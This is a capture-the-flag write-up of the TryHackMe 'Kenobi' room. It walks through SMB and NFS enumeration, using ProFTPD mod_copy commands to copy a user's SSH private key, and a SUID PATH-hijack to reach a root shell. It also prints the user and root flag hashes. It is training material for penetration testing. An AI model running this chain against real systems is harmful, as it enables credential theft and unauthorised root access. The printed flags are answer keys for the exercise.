# Kenobi – TryHackMe Writeup

## Overview

This report documents the compromise of the **Kenobi** TryHackMe machine through a combination of SMB enumeration, NFS enumeration, abuse of a vulnerable ProFTPD service, SSH key theft, and privilege escalation via PATH hijacking.

The objective was to identify exposed services, gain access to the target system, escalate privileges, and retrieve both user and root flags.

---

# Target Information

| Field     | Value        |
| --------- | ------------ |
| Target IP | 10.49.171.92 |
| Platform  | TryHackMe    |
| Room Name | Kenobi       |

---

# Executive Summary

During the assessment, multiple weaknesses were identified that allowed an attacker to progress from unauthenticated access to full root compromise.

The attack chain involved:

1. Enumerating exposed services.
2. Discovering an anonymous SMB share.
3. Enumerating an exposed NFS export.
4. Identifying a vulnerable ProFTPD service.
5. Abusing the ProFTPD mod_copy vulnerability.
6. Stealing Kenobi's SSH private key.
7. Accessing the system as Kenobi.
8. Exploiting a SUID binary through PATH hijacking.
9. Obtaining root access.

---

# Methodology

The assessment followed a standard penetration testing methodology:

* Reconnaissance
* Enumeration
* Initial Access
* Privilege Escalation

---

# Phase 1 – Reconnaissance

## Host Discovery

### Command

```bash
ping 10.49.171.92
```

### Findings

The target responded to ICMP requests, confirming network connectivity.

### Observation

```text
TTL = 62
```

The TTL value suggested that the target was likely running a Linux-based operating system.

---

# Phase 2 – Network Enumeration

## Port Scanning

### Command

```bash
nmap 10.49.171.92
```

### Results

| Port | Service |
| ---- | ------- |
| 21   | FTP     |
| 22   | SSH     |
| 80   | HTTP    |
| 111  | RPCBind |
| 139  | NetBIOS |
| 445  | SMB     |
| 2049 | NFS     |

### Analysis

The scan revealed several exposed services that could provide potential attack vectors.

Particular attention was given to:

* SMB
* FTP
* NFS

---

# Phase 3 – SMB Enumeration

## Enumerating SMB

### Command

```bash
enum4linux -a 10.49.171.92
```

### Key Findings

#### Hostname

```text
KENOBI
```

#### Workgroup

```text
WORKGROUP
```

#### Anonymous Access

```text
Server allows sessions using username '', password ''
```

### Security Impact

Anonymous SMB access allows unauthenticated users to enumerate shares and potentially access sensitive information.

---

## Accessing the SMB Share

### Command

```bash
smbclient //10.49.171.92/anonymous -N
```

### Files Found

```text
log.txt
```

### Analysis

The share exposed internal server information and confirmed the existence of services and users on the system.

---

# Phase 4 – NFS Enumeration

## Enumerating NFS Exports

### Command

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.49.171.92
```

### Findings

```text
/var
```

### Analysis

The NFS service exported the entire `/var` directory.

This meant files written inside `/var` could potentially be accessed remotely through NFS.

### Security Impact

Exposing large filesystem paths through NFS can lead to unauthorized access to sensitive files.

---

# Phase 5 – FTP Enumeration

## Service Identification

### Command

```bash
nc 10.49.171.92 21
```

### Result

```text
ProFTPD 1.3.5
```

---

## Vulnerability Research

### Command

```bash
searchsploit ProFTPD 1.3.5
```

### Result

```text
ProFTPD 1.3.5 - mod_copy
```

---

# Phase 6 – ProFTPD mod_copy Exploitation

## Understanding the Vulnerability

The FTP server was running **ProFTPD 1.3.5**, which contained the vulnerable **mod_copy** module.

The module implements two FTP commands:

```text
SITE CPFR
SITE CPTO
```

These commands are designed to copy files from one location to another on the server.

However, due to improper access controls, an unauthenticated attacker can abuse these commands to copy arbitrary files that the FTP service account can access.

### Why This Was Important

The FTP service was running under the **Kenobi** user account.

This meant that files readable by Kenobi could be copied without authentication.

The objective was to obtain Kenobi's SSH private key.

---

## Copying Kenobi's SSH Key

### Command

```bash
nc 10.49.171.92 21
```

### FTP Commands

```text
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

### Result

```text
250 Copy successful
```

### Analysis

The SSH private key was copied into `/var/tmp`.

Since `/var` was exported through NFS, the copied file could now be retrieved remotely.

---

# Phase 7 – Retrieving the SSH Key

## Mounting the NFS Share

### Commands

```bash
sudo mkdir /mnt/kenobiNFS

sudo mount -t nfs 10.49.171.92:/var /mnt/kenobiNFS
```

---

## Obtaining the Key

### Command

```bash
cp /mnt/kenobiNFS/tmp/id_rsa .
```

### Fixing Permissions

```bash
chmod 600 id_rsa
```

### Security Impact

A combination of:

* Vulnerable FTP service
* Exposed NFS share

allowed theft of a valid SSH private key.

---

# Phase 8 – Initial Access

## SSH Login

### Command

```bash
ssh -i id_rsa kenobi@10.49.171.92
```

### Result

Access was successfully obtained as:

```text
kenobi
```

---

## User Flag

### Command

```bash
cat user.txt
```

### Result

```text
d0b0f3f53b6caa532a83915e19224899
```

---

# Phase 9 – Privilege Escalation Enumeration

## SUID Enumeration

### Command

```bash
find / -perm -u=s -type f 2>/dev/null
```

### Interesting Finding

```text
/usr/bin/menu
```

### Analysis

The binary was running with elevated privileges and became the primary privilege escalation target.

---

# Phase 10 – PATH Hijacking

## Creating a Malicious Executable

### Commands

```bash
cd /tmp

echo /bin/sh > curl

chmod 777 curl
```

---

## Modifying PATH

### Command

```bash
export PATH=/tmp:$PATH
```

### Analysis

The vulnerable binary executed system commands without using absolute paths.

By placing a malicious executable named `curl` in `/tmp` and modifying the PATH variable, the operating system would execute the attacker's file instead of the legitimate binary.

---

## Exploiting the SUID Binary

### Command

```bash
/usr/bin/menu
```

### Option Selected

```text
1. status check
```

### Result

```text
root shell obtained
```

### Verification

```bash
whoami
```

```text
root
```

---

# Phase 11 – Root Access

## Root Flag

### Command

```bash
cat /root/root.txt
```

### Result

```text
177b3cd8562289f37382721c28381f02
```

---

# Attack Chain

```text
Anonymous SMB Access
        ↓
SMB Enumeration
        ↓
NFS Enumeration
        ↓
/var Export Discovered
        ↓
ProFTPD mod_copy Vulnerability
        ↓
Copy Kenobi SSH Key
        ↓
Retrieve Key Through NFS
        ↓
SSH Access as Kenobi
        ↓
SUID Enumeration
        ↓
PATH Hijacking
        ↓
Root Shell
        ↓
Root Flag Obtained
```

---

# Findings & Vulnerabilities

| ID   | Finding                                  | Severity |
| ---- | ---------------------------------------- | -------- |
| F-01 | Anonymous SMB Access                     | Medium   |
| F-02 | Exposed NFS Export                       | Medium   |
| F-03 | ProFTPD mod_copy Vulnerability           | High     |
| F-04 | SSH Private Key Disclosure               | High     |
| F-05 | Insecure File Exposure Through NFS       | High     |
| F-06 | SUID Binary Vulnerable to PATH Hijacking | Critical |

---

# Tools Used

### Enumeration

* Nmap
* Enum4Linux
* SMBClient

### Service Analysis

* Netcat
* Searchsploit

### File Access

* NFS
* Mount

### Remote Access

* SSH

### Privilege Escalation

* PATH Hijacking

---

# Conclusion

The compromise of the target system was achieved through the combination of multiple security weaknesses, including anonymous SMB access, an exposed NFS share, a vulnerable ProFTPD service, SSH key disclosure, and an insecure SUID binary.

By chaining these vulnerabilities together, it was possible to progress from unauthenticated access to full root compromise and retrieve both user and root flags from the target system.
